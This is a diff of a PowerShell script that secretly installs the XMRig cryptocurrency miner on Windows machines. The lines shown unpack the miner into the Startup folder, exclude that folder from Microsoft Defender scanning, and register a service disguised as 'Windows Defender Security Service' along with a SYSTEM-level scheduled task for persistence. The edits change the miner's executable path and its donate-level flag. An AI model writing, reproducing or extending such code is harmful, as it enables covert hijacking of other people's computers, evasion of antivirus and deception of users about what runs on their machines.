@@ -121,7 +121,7 @@ Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
 # Define hidden payload path
 $hiddenDir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 #$payloadName = "svchost.exe"
-$destinationPath = "$hiddenDir\xmrig-6.22.2\w.bat"#Join-Path $hiddenDir $payloadName
+$destinationPath = "$hiddenDir\xmrig-6.22.2\xmrig.exe"#Join-Path $hiddenDir $payloadName
 #$newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
 Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath $hiddenDir
 
@@ -150,7 +150,7 @@ Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction SilentlyContinue
 $serviceName = "WinDefendSvc_$((Get-Date).Ticks)"
 try {
     New-Service -Name $serviceName `
-        -BinaryPathName "`"$destinationPath`" --donate-level=0" `
+        -BinaryPathName "`"$destinationPath`" --donate-level=1" `
         -DisplayName "Windows Defender Security Service" `
         -StartupType Automatic `
         -Description "Provides system security services" | Out-Null
@@ -166,7 +166,7 @@ catch {
 # 2. Create SYSTEM-level Scheduled Task
 $taskName = "WinDefendTask_$((Get-Date).Ticks)"
 try {
-    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=0"
+    $action = New-ScheduledTaskAction -Execute $destinationPath -Argument "--donate-level=1"
     $trigger1 = New-ScheduledTaskTrigger -AtStartup
     $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Minutes 60)
     
